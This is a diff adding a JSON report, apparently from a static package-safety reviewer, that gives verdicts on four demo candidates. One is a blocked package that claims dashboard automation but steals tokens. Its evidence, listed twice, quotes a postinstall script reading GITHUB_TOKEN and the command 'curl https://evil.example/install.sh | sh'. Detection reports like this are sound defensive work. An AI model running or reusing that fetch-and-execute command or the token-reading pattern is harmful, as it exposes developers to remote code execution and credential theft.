@@ -1,0 +1,131 @@
+{
+  "schema": "vnem.ardProtection.v1",
+  "runId": "ard-demo-run",
+  "reviewedAt": "2026-06-07T12:45:46.504Z",
+  "reviewMode": "static metadata/declarative evidence review",
+  "candidatesReviewed": 4,
+  "allowed": 1,
+  "needsReview": 2,
+  "quarantined": 0,
+  "blocked": 1,
+  "dangerousFindings": [
+    {
+      "candidateId": "token-stealing-postinstall-kit",
+      "title": "Malware-like package claims dashboard automation but steals tokens",
+      "sourceUrl": "local://demo/token-stealing-postinstall-kit",
+      "verdict": "blocked",
+      "confidence": 0.9,
+      "reasons": [
+        "Static deterministic metadata review only; not antivirus-grade scanning.",
+        "Blocked because high-risk malware/credential/execution indicators were detected."
+      ],
+      "evidence": [
+        "postinstall script",
+        "reads process.env.GITHUB_TOKEN",
+        "curl https://evil.example/install.sh | sh",
+        "exfiltrate credentials"
+      ],
+      "dangerousSignals": [
+        "malware/virus indicator",
+        "credential/token stealing pattern",
+        "shell pipe install pattern",
+        "postinstall script surface",
+        "network exfiltration hint"
+      ],
+      "requiredManualChecks": [],
+      "givingEligible": false,
+      "excludedFromGiving": true
+    }
+  ],
+  "verdicts": [
+    {
+      "candidateId": "clean-dashboard-launcher",
+      "title": "Simplify ARD launch instructions",
+      "sourceUrl": "local://vnem/docs/current-system.md",
+      "verdict": "allow",
+      "confidence": 0.78,
+      "reasons": [
+        "Static deterministic metadata review only; not antivirus-grade scanning.",
+        "Allowed by current static checks; this does not prove the item is fully safe."
+      ],
+      "evidence": [
+        "Local VNEM package scripts",
+        "User-requested ARD vertical slice"
+      ],
+      "dangerousSignals": [],
+      "requiredManualChecks": [],
+      "givingEligible": true,
+      "excludedFromGiving": false
+    },
+    {
+      "candidateId": "missing-license-agent-ui-pattern",
+      "title": "Agent UI pattern with missing license metadata",
+      "sourceUrl": "local://demo/missing-license-agent-ui-pattern",
+      "verdict": "needs-review",
+      "confidence": 0.72,
+      "reasons": [
+        "Static deterministic metadata review only; not antivirus-grade scanning.",
+        "Needs manual review because license/source quality is incomplete."
+      ],
+      "evidence": [
+        "missing license",
+        "secondary demo source"
+      ],
+      "dangerousSignals": [],
+      "requiredManualChecks": [
+        "Verify license, primary source, provenance, and whether this is duplicate/low-signal before Giving AI use."
+      ],
+      "givingEligible": false,
+      "excludedFromGiving": true
+    },
+    {
+      "candidateId": "token-stealing-postinstall-kit",
+      "title": "Malware-like package claims dashboard automation but steals tokens",
+      "sourceUrl": "local://demo/token-stealing-postinstall-kit",
+      "verdict": "blocked",
+      "confidence": 0.9,
+      "reasons": [
+        "Static deterministic metadata review only; not antivirus-grade scanning.",
+        "Blocked because high-risk malware/credential/execution indicators were detected."
+      ],
+      "evidence": [
+        "postinstall script",
+        "reads process.env.GITHUB_TOKEN",
+        "curl https://evil.example/install.sh | sh",
+        "exfiltrate credentials"
+      ],
+      "dangerousSignals": [
+        "malware/virus indicator",
+        "credential/token stealing pattern",
+        "shell pipe install pattern",
+        "postinstall script surface",
+        "network exfiltration hint"
+      ],
+      "requiredManualChecks": [],
+      "givingEligible": false,
+      "excludedFromGiving": true
+    },
+    {
+      "candidateId": "duplicate-low-signal-dashboard-tip",
+      "title": "Duplicate low-signal dashboard tip",
+      "sourceUrl": "local://demo/duplicate-low-signal-dashboard-tip",
+      "verdict": "needs-review",
+      "confidence": 0.72,
+      "reasons": [
+        "Static deterministic metadata review only; not antivirus-grade scanning.",
+        "Needs manual review because license/source quality is incomplete."
+      ],
+      "evidence": [
+        "duplicate",
+        "low signal",
+        "no primary source"
+      ],
+      "dangerousSignals": [],
+      "requiredManualChecks": [
+        "Verify license, primary source, provenance, and whether this is duplicate/low-signal before Giving AI use."
+      ],
+      "givingEligible": false,
+      "excludedFromGiving": true
+    }
+  ]
+}
